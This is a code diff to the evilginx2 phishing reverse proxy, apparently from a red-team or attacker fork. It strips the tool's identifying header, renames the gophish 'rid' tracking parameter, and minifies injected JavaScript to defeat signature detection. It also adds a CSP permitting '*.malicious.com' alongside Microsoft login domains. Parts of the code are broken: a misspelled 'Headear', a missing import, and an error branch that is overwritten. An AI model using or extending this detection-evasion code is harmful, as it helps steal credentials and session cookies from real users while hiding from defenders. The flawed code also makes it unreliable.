@@ -39,7 +39,8 @@ import (
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
-
+	// added to avoid static js sign detection
+	"github.com/tdewolff/minify/js"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 )
@@ -203,6 +204,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			//possible IOC?
 			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
@@ -300,6 +302,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
+					//da capire
 					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
@@ -381,11 +384,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if trackParam, ok := session.Params["o"]; ok {
 											if trackParam == "track" {
 												// gophish email tracker image
-												rid, ok := session.Params["rid"]
-												if ok && rid != "" {
+												identifier, ok := session.Params["identifier"]
+												if ok && identifier != "" {
 													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
+													err = p.gophish.ReportEmailOpened(identifier, remote_addr, req.Header.Get("User-Agent"))
 													if err != nil {
 														log.Error("gophish: %s", err)
 													}
@@ -403,10 +406,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sids[session.Id] = sid
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-										rid, ok := session.Params["rid"]
-										if ok && rid != "" {
+										identifier, ok := session.Params["identifier"]
+										if ok && identifier != "" {
 											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
+											err = p.gophish.ReportEmailLinkClicked(identifier, remote_addr, req.Header.Get("User-Agent"))
 											if err != nil {
 												log.Error("gophish: %s", err)
 											}
@@ -466,10 +469,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//possible IOC
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
+						//da capire
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
@@ -576,6 +581,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
+					//da capire
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
@@ -656,7 +662,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//possible IOC
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -884,7 +891,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if resp == nil {
 				return nil
 			}
-
+			// rimosso header referer to prevent malicious sites from knowing the original site
+			resp.Header.Set("Referrer-Policy", "no-referrer")
+			// CSP header for microsoft applied to every request, to be checked/modified or removed for everty test
+			resp.Headear.Set("Content-Security-Policy", "default-src 'self' data: 'unsafe-inline' 'unsafe-hashes' 'unsafe-eval' *.malicious.com aadcdn.msauthimages.net aadcdn.msftauthimages.net aadcdn.msauth.net *.live.com *.office.com *.office.net *.microsoft.com")
 			// handle session
 			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
@@ -903,6 +913,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
+					//da capire
 					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
 						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
 					}
@@ -911,6 +922,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
+			// possible to modify if we want to add our own CPSP header
+
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
@@ -1063,10 +1076,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						s.Finish(false)
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-							rid, ok := s.Params["rid"]
-							if ok && rid != "" {
+							identifier, ok := s.Params["identifier"]
+							if ok && identifier != "" {
 								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+								err = p.gophish.ReportCredentialsSubmitted(identifier, s.RemoteAddr, s.UserAgent)
 								if err != nil {
 									log.Error("gophish: %s", err)
 								}
@@ -1203,10 +1216,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-								rid, ok := s.Params["rid"]
-								if ok && rid != "" {
+								identifier, ok := s.Params["identifier"]
+								if ok && identifier != "" {
 									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+									err = p.gophish.ReportCredentialsSubmitted(identifier, s.RemoteAddr, s.UserAgent)
 									if err != nil {
 										log.Error("gophish: %s", err)
 									}
@@ -1330,8 +1343,17 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+	//
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		minifier := minify.New() // "github.com/tdewolff/minify/js"
+		minifier.AddFunc("text/javascript", js.Minify)
+		obfuscatedScript, err := minifier.String("text/javascript", script)
+		// Handle error - Obfuscation failed
+		if err != nil {
+			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+		}
+		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
+		//d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
@@ -1340,6 +1362,9 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
+
+
+
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
@@ -1788,9 +1813,10 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+//possible IOC
+//func (p *HttpProxy) getHomeDir() string {
+//	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+//}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
